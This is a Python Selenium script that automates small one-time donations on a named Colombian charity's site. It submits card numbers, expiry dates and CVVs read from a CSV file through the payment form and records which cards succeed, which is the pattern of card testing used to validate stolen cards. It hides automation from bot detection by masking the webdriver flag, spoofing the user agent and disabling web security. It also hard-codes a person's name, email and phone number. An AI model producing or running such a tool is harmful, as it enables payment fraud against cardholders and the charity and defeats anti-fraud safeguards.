import csv
import time
import pandas as pd
import threading
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService

class WebBot:
    def __init__(self, browser_type="chrome", headless=False):
        self.browser_type = browser_type
        self.headless = headless
        self.driver = None

    def start_browser(self):
        try:
            if self.browser_type == "chrome":
                options = ChromeOptions()
                if self.headless:
                    options.add_argument("--headless")
                
                # Opciones anti-detección
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument("--disable-blink-features=AutomationControlled")
                options.add_experimental_option("excludeSwitches", ["enable-automation"])
                options.add_experimental_option('useAutomationExtension', False)
                options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                options.add_argument("--disable-web-security")
                options.add_argument("--allow-running-insecure-content")
                options.add_argument("--disable-extensions")
                
                service = ChromeService(executable_path="chromedriver-win64/chromedriver.exe")
                self.driver = webdriver.Chrome(service=service, options=options)
                
                # Ejecutar script para ocultar webdriver
                self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
                
            elif self.browser_type == "firefox":
                options = FirefoxOptions()
                if self.headless:
                    options.add_argument("--headless")
                self.driver = webdriver.Firefox(options=options)
                
            elif self.browser_type == "brave":
                options = ChromeOptions()
                options.binary_location = r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
                if self.headless:
                    options.add_argument("--headless")
                
                # Opciones anti-detección para Brave
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument("--disable-blink-features=AutomationControlled")
                options.add_experimental_option("excludeSwitches", ["enable-automation"])
                options.add_experimental_option('useAutomationExtension', False)
                options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                
                service = ChromeService(executable_path="chromedriver-win64/chromedriver.exe")
                self.driver = webdriver.Chrome(service=service, options=options)
                
                # Ejecutar script para ocultar webdriver
                self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
                
            return True
        except Exception as e:
            print(f"Error iniciando {self.browser_type}: {e}")
            return False

    def close_browser(self):
        if self.driver:
            self.driver.quit()

    def navigate_to_page(self, url):
        try:
            self.driver.get(url)
            # Esperar un poco para que la página cargue completamente
            time.sleep(2)
            return True
        except Exception as e:
            print(f"Error navegando a {url}: {e}")
            return False

    def donar_una_vez(self, numero, mes, anio, cvv):
        try:
            print(f"🔍 [{self.browser_type.upper()}] PASO 1: Abriendo página de donación...")
            if not self.navigate_to_page("https://caballerosdelavirgen.com.co/donacion/"):
                raise Exception("No se pudo cargar la página")

            wait = WebDriverWait(self.driver, 20)

            print(f"🔍 [{self.browser_type.upper()}] PASO 2: Clic en 'UNA VEZ'...")
            wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(translate(text(), 'UNAVEZ', 'unavez'), 'una vez')]"))).click()
            time.sleep(0.5)

            print(f"🔍 [{self.browser_type.upper()}] PASO 3: Clic en '$10.000'...")
            wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), '$ 10.000')]"))).click()
            time.sleep(0.5)

            print(f"🔍 [{self.browser_type.upper()}] PASO 4: Clic en botón azul...")
            boton_azul = wait.until(EC.presence_of_element_located((By.XPATH, "//button[@type='submit' and not(@disabled)]//*[contains(text(), '10.000')]")))
            self.driver.execute_script("arguments[0].click();", boton_azul)
            time.sleep(1)

            print(f"🔍 [{self.browser_type.upper()}] PASO 5: Llenando formulario...")
            wait.until(EC.presence_of_element_located((By.NAME, "full_name"))).send_keys("Juan urbina melo")
            self.driver.find_element(By.NAME, "email").send_keys("ivan@innclod.com")
            self.driver.find_element(By.NAME, "phone").send_keys("3007264042")
            Select(wait.until(EC.presence_of_element_located((By.NAME, "document_type")))).select_by_visible_text("Cédula de ciudadanía")
            self.driver.find_element(By.NAME, "document").send_keys("12345612789")

            print(f"🔍 [{self.browser_type.upper()}] PASO 6: Aceptar términos...")
            checkbox = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input[type='checkbox']")))
            self.driver.execute_script("arguments[0].click();", checkbox)
            time.sleep(1)

            print(f"🔍 [{self.browser_type.upper()}] PASO 7: Enviar para ir a pasarela...")
            boton_final = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[.//span[contains(text(), 'Una vez') and contains(text(), '10.000')]]")))
            self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", boton_final)
            self.driver.execute_script("arguments[0].click();", boton_final)
            time.sleep(3)

            print(f"🔍 [{self.browser_type.upper()}] PASO 8: Ingresando a iframe de tarjeta...")
            iframe = wait.until(EC.presence_of_element_located((By.ID, "paylands-card-frame")))
            self.driver.switch_to.frame(iframe)

            print(f"🔍 [{self.browser_type.upper()}] PASO 9: Llenando campos de tarjeta...")
            campo_pan = wait.until(EC.presence_of_element_located((By.NAME, "cardPan")))
            campo_exp = wait.until(EC.presence_of_element_located((By.NAME, "cardExpireFull")))
            campo_cvv = wait.until(EC.presence_of_element_located((By.NAME, "cvv2")))

            campo_pan.clear()
            campo_exp.clear()
            campo_cvv.clear()

            numero_formateado = ' '.join([numero[i:i+4] for i in range(0, len(numero), 4)])
            for char in numero_formateado:
                campo_pan.send_keys(char)
                time.sleep(0.05)

            campo_exp.send_keys(f"{mes.strip()}/{anio.strip()[-2:]}")
            campo_cvv.send_keys(cvv.strip())
            print(f"✅ [{self.browser_type.upper()}] Datos de tarjeta ingresados")

            self.driver.switch_to.default_content()

            print(f"🔍 [{self.browser_type.upper()}] PASO 10: Confirmar donación...")
            boton_xpath = "//button[@type='submit' and .//span[contains(text(), 'Una vez')]]"
            try:
                WebDriverWait(self.driver, 3).until(EC.invisibility_of_element_located((By.CSS_SELECTOR, "div[class*='loading'], div[class*='overlay'], .spinner")))
                print(f"✅ [{self.browser_type.upper()}] Overlay desapareció.")
            except:
                print(f"⚠️ [{self.browser_type.upper()}] No se detectó overlay.")

            boton_donar = wait.until(EC.visibility_of_element_located((By.XPATH, boton_xpath)))
            wait.until(lambda d: boton_donar.is_enabled())
            self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", boton_donar)
            self.driver.execute_script("arguments[0].click();", boton_donar)
            print(f"✅ [{self.browser_type.upper()}] Botón de pago clickeado.")
            time.sleep(5)

            print(f"🔍 [{self.browser_type.upper()}] PASO 11: Verificando resultado final...")

            try:
                WebDriverWait(self.driver, 40).until(
                    EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'gracias') or contains(text(), 'Gracias')]"))
                )
                print(f"✅ [{self.browser_type.upper()}] Donación completada (detectado 'Muchas gracias').")
                return True
            except:
                print(f"❌ [{self.browser_type.upper()}] Donación no detectada como exitosa (no se encontró 'Muchas gracias').")
                return False

        except Exception as e:
            print(f"❌ [{self.browser_type.upper()}] ERROR: {e}")
            print(f"❌ [{self.browser_type.upper()}] URL ACTUAL: {self.driver.current_url if self.driver else 'N/A'}")
            return False

def leer_tarjetas_csv(ruta):
    tarjetas = []
    with open(ruta) as csvfile:
        reader = csv.reader(csvfile, delimiter='|')
        for row in reader:
            if len(row) == 4:
                tarjetas.append(row)
    return tarjetas

def ejecutar_bot_en_navegador(browser_type, tarjetas, resultados):
    """Ejecuta el bot en un navegador específico"""
    bot = WebBot(browser_type=browser_type, headless=False)
    tarjetas_exitosas = []
    
    if bot.start_browser():
        for i, tarjeta in enumerate(tarjetas, 1):
            print(f"\n🧾 [{browser_type.upper()}] Ejecutando tarjeta {i}/{len(tarjetas)}: {tarjeta}")
            success = bot.donar_una_vez(*tarjeta)
            if success:
                tarjetas_exitosas.append(tarjeta)
            print(f"✅ [{browser_type.upper()}] Éxito" if success else f"❌ [{browser_type.upper()}] Falló")
            time.sleep(2)
        
        bot.close_browser()
    
    resultados[browser_type] = tarjetas_exitosas

# 👉 Ejecución del bot solo en Chrome
if __name__ == "__main__":
    tarjetas = leer_tarjetas_csv("tarjetas.csv")
    bot = WebBot(browser_type="chrome", headless=False)
    tarjetas_exitosas = []
    
    print("🚀 Iniciando bot en Chrome...")
    
    if bot.start_browser():
        for i, tarjeta in enumerate(tarjetas, 1):
            print(f"\n🧾 Ejecutando tarjeta {i}/{len(tarjetas)}: {tarjeta}")
            success = bot.donar_una_vez(*tarjeta)
            if success:
                tarjetas_exitosas.append(tarjeta)
            print("✅ Éxito" if success else "❌ Falló")
            time.sleep(2)
        
        bot.close_browser()
    
    if tarjetas_exitosas:
        df = pd.DataFrame(tarjetas_exitosas, columns=["Número", "Mes", "Año", "CVV"])
        df.to_excel("tarjetas_exitosas.xlsx", index=False)
        print(f"\n📄 Archivo 'tarjetas_exitosas.xlsx' generado con {len(tarjetas_exitosas)} tarjetas exitosas.")
    else:
        print("\n⚠️ No hubo tarjetas exitosas.")
